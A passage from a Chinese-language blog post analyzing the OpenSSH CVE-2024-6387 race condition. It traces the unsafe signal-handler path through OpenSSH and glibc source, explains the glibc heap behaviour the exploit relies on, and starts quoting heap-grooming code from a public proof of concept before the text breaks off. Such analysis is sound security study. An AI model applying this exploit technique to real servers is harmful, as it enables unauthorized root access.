<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s BLOG">
<meta property="og:url" content="http://hornos3.github.com/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">CVE-2024-6387 分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-07-02 10:52:01" itemprop="dateCreated datePublished" datetime="2024-07-02T10:52:01+08:00">2024-07-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-07-03 12:50:57" itemprop="dateModified" datetime="2024-07-03T12:50:57+08:00">2024-07-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>14 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>近几天，OpenSSH 爆出了一个非常严重的安全漏洞，该漏洞可导致未授权的root权限任意代码执行，即 Unauthorized root RCE。部分媒体评估称，该漏洞预计将影响超过 1400 万台使用含有该漏洞的计算机设备，其中以 Linux 发行版为主。该漏洞主要影响版本为 [8.5p1, 9.8p1)，在 9.8p1 版本中 OpenSSH 将其修复，可通过 OpenSSH release notes 查看。这个漏洞的影响是毁灭性的，它可以在基于 glibc 的 Linux 系统上远程利用，获得未经授权的Root级别代码执行。更令人担忧的是，sshd以完全特权运行，且未沙箱化，这使得攻击面更加严峻。目前，针对搭载 Glibc 的 32 位 Linux 发行版的漏洞 PoC 已经发布，根据漏洞发现者披露，该漏洞在 64 位 Linux 中很可能也可以进行利用，对于 MacOS 与 Windows 也有一定的潜在风险。</p>
<p>下面对该漏洞进行简要分析。</p>
<p>分析使用的OpenSSH版本：9.7p1</p>
<p>参考资料：<a target="_blank" rel="noopener" href="https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt">资料</a></p>
<h1 id="1-漏洞成因"><a class="markdownIt-Anchor" href="#1-漏洞成因"></a> 1. 漏洞成因</h1>
<p>这个漏洞可以看做是 CVE-2006-5051 的重演，该漏洞在 8.5p1 版本被引入，产生的原因是在 commit 752250C 中错误地删除了 sigdie() 函数中的一条语句 <code>#ifdef DO_LOG_SAFE_IN_SIGHAND</code>，该函数在<code>SIGALRM</code>信号的 handler 函数中被直接调用。因此实际上该漏洞对于 &lt;4.4p1 版本的 OpenSSH 也有效。</p>
<p>在 SSHd 的 main 函数中，通过 <code>ssh_signal</code> 函数注册了对于 <code>SIGALRM</code> 信号的 handler 函数 <code>grace_alarm_handler</code>。在 SSHd 中，如果客户端在 <code>LoginGraceTime</code> （较新版本默认为120s）时间内没有完成认证，则会产生 <code>SIGALRM</code> 信号，并异步调用 <code>grace_alarm_handler</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sshd.c, line 2222</span></span><br><span class="line"></span><br><span class="line">ssh_signal(SIGALRM, grace_alarm_handler);</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// sshd.c, line 349</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Signal handler for the alarm after the login grace period has expired.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">grace_alarm_handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Try to kill any processes that we have spawned, E.g. authorized</span></span><br><span class="line"><span class="comment">	 * keys command helpers or privsep children.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (getpgid(<span class="number">0</span>) == getpid()) &#123;</span><br><span class="line">		ssh_signal(SIGTERM, SIG_IGN);</span><br><span class="line">		kill(<span class="number">0</span>, SIGTERM);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Log error and exit. */</span></span><br><span class="line">	sigdie(<span class="string">&quot;Timeout before authentication for %s port %d&quot;</span>,</span><br><span class="line">	    ssh_remote_ipaddr(the_active_state),</span><br><span class="line">	    ssh_remote_port(the_active_state));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里重点关注 <code>sigdie</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// log.h, line 96</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> sigdie(...)		sshsigdie(__FILE__, __func__, __LINE__, 0, SYSLOG_LEVEL_ERROR, NULL, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// log.c, line 450</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">sshsigdie</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">const</span> <span class="type">char</span> *func, <span class="type">int</span> line, <span class="type">int</span> showfunc,</span></span><br><span class="line"><span class="params">    LogLevel level, <span class="type">const</span> <span class="type">char</span> *suffix, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">	va_list args;</span><br><span class="line"></span><br><span class="line">	va_start(args, fmt);</span><br><span class="line">	sshlogv(file, func, line, showfunc, SYSLOG_LEVEL_FATAL,</span><br><span class="line">	    suffix, fmt, args);</span><br><span class="line">	va_end(args);</span><br><span class="line">	_exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">sshlogv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">const</span> <span class="type">char</span> *func, <span class="type">int</span> line, <span class="type">int</span> showfunc,</span></span><br><span class="line"><span class="params">    LogLevel level, <span class="type">const</span> <span class="type">char</span> *suffix, <span class="type">const</span> <span class="type">char</span> *fmt, va_list args)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	do_log(level, forced, suffix, fmt2, args);      <span class="comment">// line 493</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// log.c, line 336</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_log</span><span class="params">(LogLevel level, <span class="type">int</span> force, <span class="type">const</span> <span class="type">char</span> *suffix, <span class="type">const</span> <span class="type">char</span> *fmt,</span></span><br><span class="line"><span class="params">    va_list args)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    syslog(pri, <span class="string">&quot;%.500s&quot;</span>, fmtbuf);  <span class="comment">// line 419</span></span><br></pre></td></tr></table></figure>
<p><code>syslog</code> 是libc实现的库函数。如果在其中调用了异步执行不安全的函数（如 <code>malloc</code> ，因为 <code>malloc</code> 进行内存分配时不会加锁），那么就有可能出现内存不安全问题。</p>
<p>事实是，它确实调用了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /misc/bits/syslog.h, line 28</span></span><br><span class="line"></span><br><span class="line">__fortify_function <span class="type">void</span></span><br><span class="line"><span class="title function_">syslog</span> <span class="params">(<span class="type">int</span> __pri, <span class="type">const</span> <span class="type">char</span> *__fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  __syslog_chk (__pri, __USE_FORTIFY_LEVEL - <span class="number">1</span>, __fmt, __va_arg_pack ());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// /misc/syslog.c, line 103</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__syslog_chk (<span class="type">int</span> pri, <span class="type">int</span> flag, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line"></span><br><span class="line">  va_start (ap, fmt);</span><br><span class="line">  __vsyslog_internal (pri, fmt, ap, (flag &gt; <span class="number">0</span>) ? PRINTF_FORTIFY : <span class="number">0</span>);</span><br><span class="line">  va_end (ap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// /misc/syslog.c, line 119</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__vsyslog_internal (<span class="type">int</span> pri, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span><br><span class="line">		    <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">now_tmp</span> =</span> __localtime64_r (&amp;now, &amp;now_tm);   <span class="comment">// line 158</span></span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// /time/localtime.c, line 27</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *</span></span><br><span class="line"><span class="class">__<span class="title">localtime64_r</span> (<span class="title">const</span> __<span class="title">time64_t</span> *<span class="title">t</span>, <span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">return</span> __tz_convert (*t, <span class="number">1</span>, tp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// /time/tzset.c, line 566</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *</span></span><br><span class="line"><span class="class">__<span class="title">tz_convert</span> (__<span class="title">time64_t</span> <span class="title">timer</span>, <span class="title">int</span> <span class="title">use_localtime</span>, <span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    tzset_internal (tp == &amp;_tmbuf &amp;&amp; use_localtime);    <span class="comment">// line 577</span></span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// /time/tzset.c, line 366</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tzset_internal</span> <span class="params">(<span class="type">int</span> always)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    __tzfile_read (tz, <span class="number">0</span>, <span class="literal">NULL</span>);    <span class="comment">// line 405</span></span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// /time/tzset.c, line 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__tzfile_read (<span class="type">const</span> <span class="type">char</span> *file, <span class="type">size_t</span> extra, <span class="type">char</span> **extrap)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    FILE *f;    <span class="comment">// line 105</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    f = fopen (file, <span class="string">&quot;rce&quot;</span>);    <span class="comment">// line 162</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (__fread_unlocked ((<span class="type">void</span> *) &amp;tzhead, <span class="keyword">sizeof</span> (tzhead),  <span class="comment">// line 182</span></span><br><span class="line">					  <span class="number">1</span>, f) != <span class="number">1</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>当 <code>__localtime64_r</code> 第一次执行时，将按照上面的流程执行。可以看到，这里的 <code>fopen</code> 即为异步不安全函数调用，它的内部需要调用 <code>malloc</code> 分配一个 <code>FILE</code> 结构。在 <code>__fread_unlocked</code> 中也需要调用 <code>malloc</code> 分配一个 4KB 的读缓冲区。</p>
<h1 id="2-漏洞利用前置知识"><a class="markdownIt-Anchor" href="#2-漏洞利用前置知识"></a> 2. 漏洞利用前置知识</h1>
<p>要深入理解该漏洞的整个利用逻辑，首先需要了解一些前置知识。</p>
<h2 id="21-相关-ssh-协议报文格式"><a class="markdownIt-Anchor" href="#21-相关-ssh-协议报文格式"></a> 2.1 相关 SSH 协议报文格式</h2>
<p>OpenSSH 实现了对于 SSH 协议的所有解析逻辑，在本漏洞中，需要了解的是 SSH 协议的算法交换部分。</p>
<p>在 SSH 建立连接之前，首先需要完成客户端与服务端的算法协商，这些算法包括密钥交换算法、报文加密算法等。因为客户端与服务端的 SSH 版本可能不同，支持的算法也可能不同，因此需要协商出客户端与服务端都实现的算法。对于算法的协商，SSH 协议通过4个报文完成：</p>
<ol>
<li>客户端将自身支持的算法发送至服务端。</li>
<li>服务端将自身支持的算法发送至客户端。</li>
<li>客户端向服务器发送自己选择的算法。</li>
<li>服务端向客户端发送响应，表示收到客户端的算法选择。</li>
</ol>
<p>在前面两个报文中，对于支持算法的发送采用的是 ASCII 明文。具体的 SSH 报文格式如下：</p>
<ul>
<li>4 bytes – SSH 报文总长度（大端序）</li>
<li>1 byte – padding length，即最后用于填充的字节数量</li>
<li>1 byte – message code，即 SSH 报文消息码，算法选择的消息码为 20/0x14</li>
<li>16 bytes – cookie</li>
<li>变长部分 – 用于列举所有本端可用的算法。每一种算法发送的格式为：
<ul>
<li>4 bytes – algorithm length，即算法描述的长度</li>
<li>变长部分 – 算法的具体内容，以 ASCII 码形式发送</li>
</ul>
</li>
</ul>
<p><img src="3.png" alt="" /></p>
<p>可想而知，对于服务端与客户端而言，要想实现对这个报文的解析，必须使用一定的内存空间保存这些算法的相关描述。这一逻辑在 SSHd 中通过 <code>sshkey.c</code> 中的 <code>cert_parse</code>（line 1761）函数实现。在这个函数中循环调用 <code>malloc</code> 函数以保存报文内容。当发送的报文解析失败时，将会调用 <code>sshkey.c</code> 中的 <code>cert_free</code>（line 569）函数循环释放这些内存空间。</p>
<h2 id="22-glibc-内存分配相关规则"><a class="markdownIt-Anchor" href="#22-glibc-内存分配相关规则"></a> 2.2 Glibc 内存分配相关规则</h2>
<p>该漏洞已经证实能够在基于 Glibc 的 Linux SSH 中完成利用。这与 Glibc 的内存分配策略高度相关。</p>
<p>Glibc 将一块用户可用堆内存（称为 chunk）的大小保存在其前面（低地址）的位置，当用户程序需要释放 chunk 时，Glibc 将根据这块内存的大小将 chunk 链入不同的链表中（这些链表称为 bins）。根据功能不同，Glibc 将这些 bins 分为几类：tcache、fastbin、small bin、large bin、unsorted bin。</p>
<p>Glibc 的内存分配主要通过 <code>_int_malloc</code> 函数实现，释放则主要通过 <code>_int_free</code> 实现。在<a href="elixir.bootlin.com">网址</a>中可以找到所有版本的 Glibc 源码，感兴趣的读者可自行查看。下面介绍与本漏洞相关的一些内存分配特性：</p>
<p>在内存分配过程中，Glibc 首先会从 tcache、fastbin、small bin 中查找，如果没有找到合适的 chunk，则会遍历 unsorted bin 进行查找。unsorted bin 中可保存任意大小的较大的 chunk，遍历过程中，如果发现不等于分配需求的 chunk，会根据其大小将其转移到合适的 small bin/large bin 中。当 unsorted bin 遍历完毕后，如果还是没有找到合适的 chunk，则会尝试在 large bins 中寻找可用的大 chunk 并拆分之。这个拆分操作需要满足多个前提条件，这里不是重点。拆分完成后，剩余的 chunk 将会保存为 last remainder，该 chunk 将被放在 unsorted bin 的开头位置，它将在下一次遍历 unsorted bin 时优先被考虑分配。需要注意的是，<font color=red><strong>remainder chunk 是在其拆分完成后设置其 size 字段的。</strong></font>在 remainder chunk 被切分出来后，但没有设置 size 前，对 size 字段进行修改，即可实际上控制这个 chunk 的大小，可以让这个 chunk 与后面的 chunk 重叠。在 size 字段被正确修改前立即将该 chunk 分配出去，即可完成对堆内存的破坏。</p>
<p><img src="CVE-2024-6387-%E5%88%86%E6%9E%90/2.png" alt="" /></p>
<p>为了保证其他的内存分配操作不会破坏所需的堆内存布局，客户端可以通过多次发送公钥数据包填充 <code>tcache</code>，为了提升利用的成功率，在公钥文件不大于256KB的情况下，可以生成27个上图的 large-small holes 结构。</p>
<h1 id="3-poc"><a class="markdownIt-Anchor" href="#3-poc"></a> 3. POC</h1>
<p>POC 来源：<a target="_blank" rel="noopener" href="https://github.com/lflare/cve-2024-6387-poc">github</a></p>
<p>下面分析POC中的关键代码逻辑。通过下面的分析可以帮助读者彻底了解该漏洞的利用方式、</p>
<p>在POC中，首先需要进行与SSH服务器的连接与密钥交换。这部分代码不是重点，略过。</p>
<h2 id="31-堆内存布局"><a class="markdownIt-Anchor" href="#31-堆内存布局"></a> 3.1 堆内存布局</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">prepare_heap</span> <span class="params">(<span class="type">int</span> sock)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Packet a: Allocate and free tcache chunks</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> tcache_chunk[<span class="number">64</span>];</span><br><span class="line">      <span class="built_in">memset</span> (tcache_chunk, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span> (tcache_chunk));</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, tcache_chunk, <span class="keyword">sizeof</span> (tcache_chunk));</span><br><span class="line">      <span class="comment">// These will be freed by the server, populating tcache</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Packet b: Create 27 pairs of large (~8KB) and small (320B) holes</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Allocate large chunk (~8KB)</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> large_hole[<span class="number">8192</span>];</span><br><span class="line">      <span class="built_in">memset</span> (large_hole, <span class="string">&#x27;B&#x27;</span>, <span class="keyword">sizeof</span> (large_hole));</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, large_hole, <span class="keyword">sizeof</span> (large_hole));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Allocate small chunk (320B)</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> small_hole[<span class="number">320</span>];</span><br><span class="line">      <span class="built_in">memset</span> (small_hole, <span class="string">&#x27;C&#x27;</span>, <span class="keyword">sizeof</span> (small_hole));</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, small_hole, <span class="keyword">sizeof</span> (small_hole));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Packet c: Write fake headers, footers, vtable and _codecvt pointers</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">char</span> fake_data[<span class="number">4096</span>];</span><br><span class="line">      create_fake_file_structure (fake_data, <span 